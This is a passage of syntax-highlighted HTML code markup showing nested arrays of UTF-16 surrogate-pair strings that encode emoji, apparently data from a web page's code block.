class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de2e&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2c&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de15&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de29&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de2f&quot;</span>, <span class="string">&quot;d83d,de1c&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de0c&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de26&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de06&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0e&quot;</span>, <span class="string">&quot;d83d,de27&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de1f&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de08&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de28&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de00&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>, <span class="string">&quot;d83d,de0f&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de13&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de24&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de04&quot;</span>, <span class="string">&quot;d83d,de11&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de0a&quot;</span>, <span class="string">&quot;d83d,de19&quot;</span>, <span class="string">&quot;d83d,de21&quot;</span>, <span class="string">&quot;d83d,de02&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1e&quot;</span>, <span class="string">&quot;d83d,de25&quot;</span>, <span class="string">&quot;d83d,de1a&quot;</span>, <span class="string">&quot;d83d,de10&quot;</span>, <span class="string">&quot;d83d,de22&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de09&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de2d&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de2a&quot;</span>, <span class="string">&quot;d83d,de18&quot;</span>, <span class="string">&quot;d83d,de0b&quot;</span>, <span class="string">&quot;d83d,de07&quot;</span>, <span class="string">&quot;d83d,de1b&quot;</span>, <span class="string">&quot;d83d,de20&quot;</span>, <span class="string">&quot;d83d,de03&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de2b&quot;</span>,</span><br><span class="line">        <span class="string">&quot;d83d,de1d&quot;</span>, <span class="string">&quot;d83d,de0d&quot;</span>, <span class="string">&quot;d83d,de05&quot;</span>, <span class="string">&quot;d83d,de23&quot;</span>, <span class="string">&quot;d83d,de14&quot;</span>, <span class="string">&quot;d83d,de17&quot;</span>, <span class="string">&quot;d83d,de01&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;d83d,de12&quot;</span>, <span class="string">&quot;d83d,de16&quot;</span>, <span 